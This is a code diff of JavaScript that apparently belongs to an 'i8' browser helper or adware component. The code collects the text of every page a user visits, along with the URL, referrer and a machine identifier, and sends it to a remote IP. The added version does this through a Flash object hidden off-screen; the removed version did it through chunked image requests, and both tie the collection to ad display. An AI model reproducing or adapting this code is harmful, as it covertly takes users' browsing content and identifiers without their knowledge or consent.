@@ -31,6 +31,11 @@ _gaq.push(
 		return;
 	}
 
+    window.i8vars ={
+        charset : document.charset || document.characterSet,
+        cmtorid : 'i8_communicator',
+    };
+
 	I8Body= 101;
 	if( i8bho_nocgif ){
 		I8px('http://rbho.i8.com.cn:8088/c.gif?nid='+i8bho_nid+'&cmac='+i8bho_cmac+'&oemid='+i8bho_bindoemid+'&cver='+i8bho_cver+'&bv='+i8bho_BV+'&r='+document.referrer);
@@ -470,7 +475,7 @@ function I8bho_print()
 
 		//distrebuted text collection system
 		if( rand(1,100)<=100 )
-            sendText();
+            sendText(text);
 //			I8px('http://211.154.172.172/text?text=' + encodeURIComponent(text).substr(0, 1024) );
 
 		//match
@@ -487,47 +492,55 @@ function I8bho_print()
 		return matches;
 	};
 
-    function sendText()
+    function installCommunicator()
     {
-        var first_request_carry_data = true;
-        var text = document.body.innerText,
-            prefix = 'http://211.154.172.172/text?n=',
-            turn = '&t=',
-            param = '&c=',
-            paraSize = (msie ? ((msie<8) ? 1024 : 4096) : 4096),
-            maxTimes = (msie ? ((msie<8) ? 4 : 6) : 4) + first_request_carry_data,
-            metaSize = prefix.length + turn.length + param.length + (maxTimes.toString().length << 1);
-        if (text === undefined) return;
-        var step = paraSize - metaSize, maxSize = step * maxTimes;
-        content = encodeURIComponent((text.length > maxSize ? text.substr(0, maxSize) : text).replace(/\s{2,}/g, ' ').replace(/[\n&]/g, ' ')).substr(0, maxSize);
-        var total = Math.ceil(content.length/step);
-        prefix += total + turn;
-        var brkPos = [0];
-        for (var i = 1, p = 0; i <= total + first_request_carry_data; ++i)
+        var host = "211.154.172.172", port = "10010";
+        var swf = 'Communicator.swf?' + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset;
+        var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" WIDTH="550" HEIGHT="400" style="border:1px solid red;" id="' + i8vars.cmtorid + '">' +
+               '<param name=host value="' + host + '">'             +
+               '<param name=port value="' + port + '">'             +
+               '<param name=charset value="' + i8vars.charset +  '">'      +
+               '<param name=movie value="' + swf + '">'             +
+               '<param name=allowscriptaccess value="always">'             +
+               '<param name=quality value=low>'                     +
+               '<embed src="' + swf + '" allowscriptaccess=always quality=low bgcolor=#FFFFFF WIDTH="550" HEIGHT="400" NAME="' + i8vars.cmtorid + '" TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer"></embed>' +
+               '</object>';
+        var div = document.createElement('div');
+        div.style.visibility = 'hidden';
+        div.style.position = 'absolute';
+        div.style.x = '-10000px';
+        div.style.y = '-10000px';
+        div.style.width = '1px';
+        div.style.height = '1px';
+        div.style.overflow = 'hidden';
+        div.innerHTML = html;
+        document.body.appendChild(div);
+    }
+
+    function sendText(text)
+    {
+        if (window.i8vars.cmtorinstalled === undefined)
         {
-            p = brkPos[i - 1] + step;
-            brkPos[i] = content[p - 2] == '%' ? (p - 2) : (content[p - 1] == '%' ? (p - 1) : p);
+            window.i8vars.cmtorinstalled = true;
+            installCommunicator();
         }
-        function sendRemains()
+        var cmtor = msie ? window[i8vars.cmtorid] : document[i8vars.cmtorid];
+        var meta = {url:document.location.href, ref:document.referrer};
+        if (!cmtor || !cmtor.call)
         {
-            for (var i = +first_request_carry_data, cursor, end = brkPos.length - 1, para; i < end; )
+            return setTimeout(function(){sendText(text);}, 1000);
+        }
+        window.crawlPage = function(res)
+        {
+            if (res == 'n')
             {
-                cursor = brkPos[i];
-                para = content.substr(cursor, brkPos[++i] - cursor);
-                if (i == end)
-                {
-                    if (para.length >= paraSize)
-                    {
-                        para = para.substr(0, para[paraSize - 2] == '%' ? (paraSize - 2) : (para[paraSize - 1] == '%' ? (paraSize - 1) : paraSize));
-                    }
-                }
-                I8px(prefix + i + param + para);
+                cmtor.crawl(null, meta, text);
             }
-        }
-        var img = new Image();
-        img.onload = sendRemains;
-        img.onerror = function() { /* show ads */ }
-        img.src = prefix + (+first_request_carry_data).toString() + (first_request_carry_data ? (param + content.substr(brkPos[0], brkPos[1])) : '');
+            else
+            { // show ads.
+            }
+        };
+        cmtor.call("pageExists", 'crawlPage', meta, i8vars.charset);
     }
 
 	//load Google Analytics
